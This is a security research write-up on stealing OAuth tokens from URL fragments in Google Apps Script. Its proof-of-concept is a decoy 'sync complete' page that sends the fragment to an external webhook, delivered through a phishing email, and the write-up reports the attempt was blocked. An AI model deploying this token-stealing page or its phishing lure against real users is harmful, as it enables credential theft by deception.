# Case Study: Analysis of URL Fragment Exfiltration in Google Apps Script
# 🎯 Executive Summary
This research explored the potential for data exfiltration within the Google Apps Script HtmlService environment. The goal was to determine if a malicious script could capture sensitive URL fragments (e.g., OAuth tokens) and transmit them to an external listener.

# 🛠️ The Hypothesis
By leveraging `window.location.hash`, a client-side script could access data that is not typically sent to the server. An attacker could theoretically use a "tracking pixel" (Image object) to bypass standard form-submission restrictions and send this data to an external webhook.

# 🔬 Proof of Concept (PoC)
**Vector: Google Apps Script Web App (`/exec endpoint`).**

**Payload:**
JavaScript
```
function doGet(e) {
  // This creates a benign-looking "Sync Complete" page
  return HtmlService.createHtmlOutput(`
    <html>
      <head><title>Handshake Complete</title></head>
      <body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
        <h2>Handshake Successful</h2>
        <p>Your Project P3S4 workspace is now synchronized.</p>
        <script>
          // The Magic: Grab the data after the '#' and send it to your listener
          const fragment = window.location.hash.substring(1);
          if (fragment) {
            new Image().src = 'https://webhooksite.net/UNIQUE_ID?data=' + encodeURIComponent(fragment);
            console.log("Fragment detected:", fragment);
            alert("Syncing: " + fragment);
          }
        </script>
      </body>
    </html>
  `);
}
```
**Delivery:** Phishing simulation via a "Support Ticket Update" email (see screenshots in `/assets`).

# 🛡️ Outcome & Security Analysis
**Result:** Blocked by Platform Security Controls.

The attempt to exfiltrate data to the external webhook failed. Upon technical review, the failure is attributed to Google's robust security architecture:

**Strict Content Security Policy (CSP):** The `script.googleusercontent.com` domain restricts the `img-src` and `connect-sr`c directives, preventing unauthorized outbound `GET` requests.

Sandboxed Environment: The script executes within a specialized iframe that strips or restricts certain cross-origin capabilities.

# 💡 Key Takeaways
This research confirms the effectiveness of Google's Defense-in-Depth strategy regarding Apps Script. While the script can execute logic and interact with the user, it is effectively isolated from making unauthorized external connections, significantly mitigating the risk of token theft via this specific vector.
